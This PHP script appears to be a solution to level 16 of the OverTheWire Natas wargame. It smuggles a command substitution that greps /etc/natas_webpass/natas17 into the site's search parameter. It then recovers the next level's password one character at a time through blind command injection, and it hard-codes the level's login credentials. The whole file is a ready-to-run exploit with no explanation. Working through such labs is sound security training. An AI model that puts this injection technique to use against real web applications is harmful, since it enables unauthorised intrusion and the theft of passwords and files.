<?php
$elems =  array_merge(range('A', 'Z'), range('a', 'z'),range(0,9));
$wrd = "hacker";
$fullText = "";
for ($j=0; $j < count($elems); $j++) { 
    $found = false;
    for ($i=0; $i < count($elems); $i++) {
        $currentChar = $elems[$i];
        $rawTxt = ("$(grep -E ^".($fullText.$currentChar).".* /etc/natas_webpass/natas17)".$wrd);
        $encodedStr = urlencode($rawTxt);
        $host = "http://natas16.natas.labs.overthewire.org/index.php?debug=true&needle={$encodedStr}";
        $ch = curl_init($host);
        curl_setopt($ch, CURLOPT_HEADER, 1);
        curl_setopt($ch, CURLOPT_USERPWD,"natas16:TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
        $return = curl_exec($ch);
        curl_close($ch);
        $strPsExist = strpos($return,$wrd);
        if($strPsExist === false)
        {
            $fullText .= $currentChar;
            echo $fullText;
            echo "\n";
            $found = true;
        }
    }
    if(!$found)
    {
        echo "The password for the next level is:\n";
        echo $fullText;
        break;
    }
}

?>